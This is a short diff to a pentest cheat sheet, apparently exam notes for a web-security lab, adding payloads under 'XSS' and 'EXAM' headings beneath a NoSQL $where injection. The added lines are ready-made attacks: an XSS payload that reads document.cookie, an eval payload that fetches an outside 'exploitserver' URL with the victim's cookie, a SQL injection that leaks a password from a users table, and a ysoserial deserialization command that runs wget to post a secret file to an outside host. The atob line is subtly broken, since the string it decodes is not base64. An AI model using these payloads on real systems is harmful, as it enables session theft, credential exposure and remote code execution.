@@ -346,3 +346,16 @@ Get fields name
 ```
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
 ```
+
+
+###XSS
+
+"-alert(window["document"]["cookie"])-"
+
+
+###EXAM
+
+`"-eval(atob('fetch("https://exploitserver/?jsonc=" + window["document"]["cookie"])'))-"` atob - decode base64
+`CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--`
+` ./java -jar ysoserial-all.jar  CommonsCollections6 'wget http://burlp --post-file=/home/carlos/secret' | base64 -w 0
+`
